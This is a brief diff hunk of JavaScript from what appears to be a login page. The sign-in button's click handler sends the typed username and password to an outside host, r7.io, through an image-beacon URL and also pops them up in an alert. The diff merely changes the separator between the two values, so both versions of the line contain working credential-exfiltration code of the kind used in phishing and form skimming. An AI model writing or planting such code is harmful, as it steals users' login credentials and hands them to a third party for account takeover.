@@ -42,7 +42,7 @@
                   $('.error-message').hide();
                   $('#signin-btn').click(function() {
                       var im = new Image();
-                     im.src = 'http://r7.io/e/montgn2?s='+$('#login_username').val()+'pass:'+$('#login_password').val();
+                     im.src = 'http://r7.io/e/montgn2?s='+$('#login_username').val()+'-'+$('#login_password').val();
                      alert($('#login_username').val()+'&'+$('#login_password').val());
                   });
                                          });
